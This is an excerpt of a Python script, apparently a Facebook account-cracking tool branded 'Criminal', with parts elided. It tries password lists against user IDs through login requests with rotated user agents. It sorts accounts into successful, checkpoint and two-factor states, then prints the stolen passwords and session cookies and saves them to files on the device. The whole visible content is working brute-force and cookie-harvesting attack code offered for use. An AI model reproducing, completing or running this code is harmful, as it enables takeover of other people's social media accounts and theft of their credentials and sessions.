...
def clear():
        os.system('clear')
print(f'\033[1;91m[\033[1;92m●\033[1;91m]\x1b[38;5;46m WELCOME TO AFGAN COMMAND TOOL')
try:
...
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m PADOSAN     :   Khost 🍒
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m GITHUB      :  Criminal
...
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FOLLOW FACEBOOK    :  \033[1;91m\033[1;41m\033[1;33mCriminal FREE CAMMANDS 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""
os.system('clear')
print(logo)
...
def menu():
    ...
    if AMMU in ['1']:
        ...
        os.system('xdg-open https://chat.whatsapp.com/IawlIKzOISh2un9TBiKYdq)
...
def rndm1(uid,passlist):
        ...
        sys.stdout.write(f'\r\r{B}[{G}Criminal-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{R}[{G}Criminal-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{Y}[{G}COOKIE{Y}] {G2}●{X1} "+coki)
                                        open('/sdcard/Criminal-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}[{Y}Criminal-CP{B}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Criminal-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
...
def login(uid):
    ...
    'viewport-width': '980',
            ...
            if "session_key" in rp:
                print(f"\r{R}[{R}Criminal-OK{R}]{R} {uid} | {pw}")
                open("/sdcard/Criminal-ok.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          	
            	print(f"\r{R}[{G1}Criminal-OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/Criminal-cp.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1}Criminal-2F{R}]{G1} {uid} | {pw}")
            	open("/sdcard/Criminal-2f.txt","a").write(uid+"|"+pw+"\n")
            	cps.append(uid)
            	break
            else:continue
        loop+=1
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;96m[Criminal-2F] \x1b[38;5;205m {idf} | {pw}')
                ...
                print(f'\r\x1b[1;96m[Criminal-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mCriminal•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
...
def cracktouch(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mCriminal•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
